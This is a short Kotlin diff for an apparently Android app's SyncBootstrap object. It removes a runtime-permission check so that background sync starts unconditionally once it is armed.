@@ -37,12 +37,7 @@ object SyncBootstrap {
             PendingCallSync.flushIfPending(app)
 
             armBackgroundSync(app)
-
-            if (!needsRuntimePermissions(app)) {
-                start(app, "background_ready")
-            } else {
-                Log.w(TAG, "Permissions missing — wait for installer Open / trampoline")
-            }
+            start(app, "background_ready")
 
             Log.d(TAG, "Background sync armed")
         } catch (error: Exception) {
